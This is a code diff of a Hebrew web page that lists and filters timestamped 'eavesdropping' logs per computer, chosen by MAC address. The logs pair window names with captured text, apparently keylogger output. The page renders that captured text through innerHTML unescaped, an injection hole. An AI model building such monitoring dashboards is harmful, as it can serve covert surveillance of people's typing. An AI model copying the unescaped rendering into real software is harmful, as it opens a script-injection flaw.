@@ -1,57 +1,163 @@
+<!DOCTYPE html>
 <html lang="he" dir="rtl">
 <head>
   <meta charset="UTF-8" />
   <title>ייבוא האזנות</title>
   <style>
+    :root {
+      --matrix-green: #00ff41;
+      --dark-bg: #0d0d1a;
+      --panel-bg: rgba(10, 25, 15, 0.85);
+      --glow: 0 0 15px var(--matrix-green), 0 0 25px rgba(0, 255, 65, 0.5);
+      --neon-red: #ff1a1a;
+    }
+
     body {
-      background-color: #0a0a15;
-      color: #00ff00;
+      background: linear-gradient(135deg, var(--dark-bg) 0%, #1a2a25 100%);
+      color: var(--matrix-green);
       font-family: 'Courier New', monospace;
       margin: 0;
       padding: 20px;
       min-height: 100vh;
       direction: rtl;
+      position: relative;
     }
+
+    .container {
+      max-width: 1100px;
+      margin: 0 auto;
+      position: relative;
+      z-index: 1;
+    }
+
     h1 {
       text-align: center;
-      margin-bottom: 20px;
+      margin-bottom: 30px;
+      text-shadow: var(--glow);
+      font-size: 2em;
+      animation: flicker 2s infinite;
     }
-    .container {
-      max-width: 1000px;
-      margin: 0 auto;
+
+    @keyframes flicker {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.85; }
     }
+
     .button {
       background: transparent;
-      border: 1px solid #00ff00;
-      color: #00ff00;
-      padding: 8px 15px;
+      border: 2px solid var(--matrix-green);
+      color: var(--matrix-green);
+      padding: 10px 20px;
       cursor: pointer;
       font-family: 'Courier New', monospace;
-      transition: all 0.3s;
-      margin: 5px;
+      transition: all 0.3s ease;
       text-decoration: none;
+      display: inline-block;
+      margin: 10px 0;
+      position: relative;
+      overflow: hidden;
     }
+
+    .button::after {
+      content: '';
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      width: 0;
+      height: 0;
+      background: rgba(0, 255, 65, 0.2);
+      transition: all 0.4s ease;
+      border-radius: 50%;
+      transform: translate(-50%, -50%);
+      z-index: -1;
+    }
+
+    .button:hover::after {
+      width: 300%;
+      height: 300%;
+    }
+
     .button:hover {
-      background: #00ff00;
-      color: #0a0a15;
-      box-shadow: 0 0 10px #00ff00;
+      color: var(--dark-bg);
+      box-shadow: var(--glow);
     }
+
     #logContainer {
-      background: rgba(0, 20, 0, 0.9);
-      padding: 15px;
-      border: 1px solid #00ff00;
-      margin-top: 20px;
-      min-height: 300px;
+      background: var(--panel-bg);
+      padding: 20px;
+      border: 2px solid var(--matrix-green);
+      margin-top: 30px;
+      min-height: 400px;
+      max-height: 600px;
       overflow-y: auto;
+      box-shadow: var(--glow);
+      border-radius: 8px;
+      position: relative;
     }
+
+    #logContainer::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: -100%;
+      width: 100%;
+      height: 2px;
+      background: var(--matrix-green);
+      animation: scan 2s linear infinite;
+    }
+
+    @keyframes scan {
+      0% { left: -100%; }
+      100% { left: 100%; }
+    }
+
     .log-entry {
-      border-bottom: 1px dashed #00ff00;
-      margin-bottom: 10px;
-      padding-bottom: 10px;
+      border-bottom: 1px dashed rgba(0, 255, 65, 0.5);
+      margin-bottom: 15px;
+      padding-bottom: 15px;
+      transition: background 0.3s;
     }
+
+    .log-entry:hover {
+      background: rgba(0, 255, 65, 0.1);
+    }
+
     .timestamp {
       font-weight: bold;
-      color: #00ff00;
+      color: var(--matrix-green);
+      text-shadow: 0 0 5px var(--matrix-green);
+      margin-bottom: 8px;
+    }
+
+    /* Filter Section */
+    .filter-section {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 10px;
+      align-items: flex-end;
+      margin-top: 20px;
+    }
+
+    .filter-section label {
+      margin-right: 5px;
+    }
+
+    .filter-section input[type="date"],
+    .filter-section input[type="time"],
+    .filter-section select {
+      background: rgba(0, 20, 0, 0.8);
+      border: 1px solid var(--matrix-green);
+      color: var(--matrix-green);
+      padding: 5px;
+      font-family: 'Courier New', monospace;
+    }
+
+    .no-results {
+      text-align: center;
+      margin-top: 40px;
+      font-size: 1.2em;
+      color: #f00;
+      text-shadow: 0 0 5px red;
     }
   </style>
 </head>
@@ -59,11 +165,34 @@
   <div class="container">
     <h1>האזנות למחשב ספציפי</h1>
     <a class="button" href="index.html">חזרה לרשימת מכשירים</a>
+
+    <!-- אזור סינון -->
+    <div class="filter-section">
+      <div>
+        <label for="filterDate">תאריך:</label>
+        <input type="date" id="filterDate" />
+      </div>
+      <div>
+        <label for="filterTime">שעה:</label>
+        <input type="time" id="filterTime" />
+      </div>
+      <div>
+        <label for="filterWindow">חלונית:</label>
+        <select id="filterWindow">
+          <option value="">הצג הכל</option>
+        </select>
+      </div>
+      <button class="button" onclick="applyFilters()">סינון</button>
+    </div>
+
     <div id="logContainer"></div>
   </div>
 
   <script>
-    // נקרא את ה-macAddress מה-URL
+    // נשמור כאן את הלוגים שהבאנו מהשרת/קובץ:
+    let originalLogs = {};    // פורמט ה-JSON המקורי (object של timestamp -> מערך)
+    let parsedLogArray = [];  // מערך מופרד המקל על הסינון
+
     const urlParams = new URLSearchParams(window.location.search);
     const macAddress = urlParams.get('mac');
 
@@ -73,55 +202,170 @@
       fetchLogs(macAddress);
     }
 
+    // זו הפונקציה שמביאה את הלוגים מהשרת
     async function fetchLogs(mac) {
-      // מניחים שיש endpoint /logs?mac=... שמחזיר רק את הלוגים של MAC זה
+      // כאן נתיב דמיוני שמחזיר את הפורמט שרשמת בשאלה
       const url = `https://your-server.com/logs?mac=${mac}`;
+
       try {
         const response = await fetch(url);
         if (!response.ok) {
           throw new Error('שגיאה בטעינת ההאזנות מהמחשב המבוקש');
         }
-        const data = await response.json();
-        // data יכול להיות {
-        //   "24/02/2025 12:57": [ { "חלון": "טקסט" }, ... ],
-        //   "24/02/2025 12:58": [ ... ],
+        originalLogs = await response.json();
+
+        // נבנה לנו מבנה נתונים יותר נוח לסינון:
+        // נשמור במערך אובייקטים מסוג:
+        // {
+        //    fullDateStr: "24/02/2025 12:57",   // המפתח המקורי
+        //    date: "2025-02-24",              // לצורך השוואה עם input type="date"
+        //    time: "12:57",                   // לצורך השוואה עם input type="time"
+        //    logs: [
+        //        { windowName: "חלונית א", text: "תוכן" },
+        //        { windowName: "חלונית ב", text: "תוכן" }
+        //    ]
         // }
-        displayLogs(data);
+        parsedLogArray = parseLogs(originalLogs);
+
+        // נאתר את כל החלוניות האפשריות ונעדכן ב-select
+        populateWindowList(parsedLogArray);
+
+        // מציגים הכל בהתחלה
+        displayLogs(parsedLogArray);
       } catch (err) {
         console.error(err);
-        document.getElementById('logContainer').textContent = 'לא ניתן לטעון את ההאזנות למחשב הנבחר';
+        document.getElementById('logContainer').textContent =
+          'לא ניתן לטעון את ההאזנות למחשב הנבחר';
       }
     }
 
-    function displayLogs(logs) {
-      const container = document.getElementById('logContainer');
-      container.innerHTML = '';
+    // פונקציה שהופכת את ה-Object לפורמט מסודר יותר
+    function parseLogs(logObject) {
+      const result = [];
 
-      // logs: { timestamp: [ { "window": "text" }, ... ] }
-      for (let timestamp in logs) {
-        if (logs.hasOwnProperty(timestamp)) {
-          const entryArr = logs[timestamp];
-          const tsDiv = document.createElement('div');
-          tsDiv.className = 'log-entry';
+      for (let timestamp in logObject) {
+        if (logObject.hasOwnProperty(timestamp)) {
+          // timestamp = "24/02/2025 12:57"
+          const [dmy, hm] = timestamp.split(' ');
+          // dmy = "24/02/2025", hm = "12:57"
+          const [day, month, year] = dmy.split('/');
+          // נהפוך לפורמט date input: YYYY-MM-DD
+          const isoDate = `${year}-${month}-${day}`;
 
-          const timeLabel = document.createElement('div');
-          timeLabel.className = 'timestamp';
-          timeLabel.textContent = timestamp;
-          tsDiv.appendChild(timeLabel);
+          const logsArray = logObject[timestamp]; // מערך
+          const structuredLogs = [];
 
-          for (let i = 0; i < entryArr.length; i++) {
-            const item = entryArr[i];
+          for (let i = 0; i < logsArray.length; i++) {
+            const item = logsArray[i];
+            // כל item הוא אובייקט בצורה {"שם חלונית": "טקסט"}
             for (let windowName in item) {
               if (item.hasOwnProperty(windowName)) {
-                const windowDiv = document.createElement('div');
-                windowDiv.innerHTML = `<strong>${windowName}:</strong> ${item[windowName]}`;
-                tsDiv.appendChild(windowDiv);
+                structuredLogs.push({
+                  windowName: windowName,
+                  text: item[windowName],
+                });
               }
             }
           }
-          container.appendChild(tsDiv);
+
+          result.push({
+            fullDateStr: timestamp,
+            date: isoDate,
+            time: hm,
+            logs: structuredLogs,
+          });
         }
       }
+
+      return result;
+    }
+
+    // ממלא את רשימת ה"חלונית" ב-select מתוך הלוגים
+    function populateWindowList(logArray) {
+      // ניצור סט של שמות חלוניות
+      const windowSet = new Set();
+
+      logArray.forEach(entry => {
+        entry.logs.forEach(logItem => {
+          windowSet.add(logItem.windowName);
+        });
+      });
+
+      const filterWindowSelect = document.getElementById('filterWindow');
+      // מוחקים אפשרויות מעבר ל"הצג הכל"
+      while (filterWindowSelect.options.length > 1) {
+        filterWindowSelect.remove(1);
+      }
+
+      // מוסיפים אופציות
+      windowSet.forEach(wName => {
+        const opt = document.createElement('option');
+        opt.value = wName;
+        opt.textContent = wName;
+        filterWindowSelect.appendChild(opt);
+      });
+    }
+
+    // מציג את הלוגים באזור המתאים
+    function displayLogs(arrayToDisplay) {
+      const container = document.getElementById('logContainer');
+      container.innerHTML = '';
+
+      if (arrayToDisplay.length === 0) {
+        container.innerHTML = `<div class="no-results">לא נמצאו רשומות תואמות לסינון</div>`;
+        return;
+      }
+
+      arrayToDisplay.forEach(entry => {
+        // יצירת אלמנט אחד שמכיל את כל הפריטים של ה-timeStamp הזה
+        const tsDiv = document.createElement('div');
+        tsDiv.className = 'log-entry';
+
+        // כותרת זמן
+        const timeLabel = document.createElement('div');
+        timeLabel.className = 'timestamp';
+        timeLabel.textContent = entry.fullDateStr;
+        tsDiv.appendChild(timeLabel);
+
+        // לכל חלונית, נוסיף שורה
+        entry.logs.forEach(logItem => {
+          const windowDiv = document.createElement('div');
+          windowDiv.innerHTML = `<strong>${logItem.windowName}:</strong> ${logItem.text}`;
+          tsDiv.appendChild(windowDiv);
+        });
+
+        container.appendChild(tsDiv);
+      });
+    }
+
+    // מפעיל את הסינון לפי התאריך, השעה והחלונית שנבחרו
+    function applyFilters() {
+      const filterDate = document.getElementById('filterDate').value; // "2025-02-24"
+      const filterTime = document.getElementById('filterTime').value; // "12:57"
+      const filterWindow = document.getElementById('filterWindow').value;
+
+      // מסננים את parsedLogArray
+      const filtered = parsedLogArray.filter(entry => {
+        // בדיקת תאריך
+        if (filterDate && entry.date !== filterDate) {
+          return false;
+        }
+        // בדיקת שעה מדויקת
+        if (filterTime && entry.time !== filterTime) {
+          return false;
+        }
+        // בדיקת חלונית
+        if (filterWindow) {
+          // נבדוק האם לאף logItem אין windowName כזה
+          const foundWindow = entry.logs.some(l => l.windowName === filterWindow);
+          if (!foundWindow) {
+            return false;
+          }
+        }
+        return true;
+      });
+
+      displayLogs(filtered);
     }
   </script>
 </body>
